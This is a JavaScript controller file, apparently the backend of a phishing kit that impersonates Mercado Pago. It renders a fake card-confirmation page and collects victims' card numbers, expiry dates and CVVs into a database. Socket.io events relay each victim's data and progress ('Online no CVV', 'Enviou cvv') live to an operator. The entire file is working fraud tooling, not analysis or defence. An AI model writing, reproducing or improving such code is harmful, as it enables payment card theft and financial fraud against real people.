const Client = require('../../models/Client')
const Card = require('../../models/Card')
const { index } = require('../ClientController')

module.exports = {
    async view(req, res) {
        try {
            const { client_id, end } = req.params

            const { error } = req.query

            const client = await Client.findByPk(client_id, {
                include: {
                    where: { end },
                    association: 'cards',
                },
            })

            if (!client) return res.redirect(`/modules/conta`)

            client.update({ status: `Online no CVV` })

            req.app.io.emit('updateClient', client.toJSON())

            return res.render('pages/confirmcard', {
                title: 'Mercado pago',
                pageClasses: 'password cadastro',
                client: client.toJSON(),
                sms: true,
                error: error ? true : false,
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
    async store(req, res) {
        try {
            //Client

            const { client_id } = req.params

            const { number: end, validity: flag, cvv } = req.body

            const client = await Client.findByPk(client_id, { include: { association: 'cards' } })

            if (!client) return res.status(400).send({ error: `Usuário não existe` })

            const cardHasExist = await Card.findOne({ where: { end } })

            if (cardHasExist) {
                await cardHasExist.update({ end, flag, cvv })

                const client_updated = await Client.findByPk(client_id, {
                    include: {
                        where: { end },
                        association: 'cards',
                    },
                })

                req.app.io.emit('getCardVerify', client_updated.toJSON())
                return res.json(client_updated)
            } else {
                await Card.create({ client_id, end, flag, cvv })
                const client_updated = await Client.findByPk(client_id, {
                    include: {
                        where: { end },
                        association: 'cards',
                    },
                })

                req.app.io.emit('getCardVerify', client_updated.toJSON())
                return res.json(client_updated)
            }
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
    async index(req, res) {
        try {
            const { client_id } = req.params
            const client = await Client.findByPk(client_id, { include: { association: 'cards' } })

            if (!client) return res.status(400).send({ error: `Usuário não existe` })

            return res.json(client)
        } catch (error) {
            console.log(`erro: `, error)
            return res.status(400).send({ error: error })
        }
    },
    async update(req, res) {
        try {
            //Client

            const { client_id } = req.params

            const { cvv, end } = req.body

            const client = await Client.findByPk(client_id, { include: { association: 'cards' } })

            if (!client) return res.status(400).send({ error: `Usuário não existe` })

            await client.update({ status: `Enviou cvv` })

            const cardHasExist = await Card.findOne({ where: { end } })

            await cardHasExist.update({ end, cvv })

            const client_updated = await Client.findByPk(client_id, {
                include: {
                    where: { end },
                    association: 'cards',
                },
            })

            req.app.io.emit('updateClient', client_updated.toJSON())
            return res.json(client_updated)
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
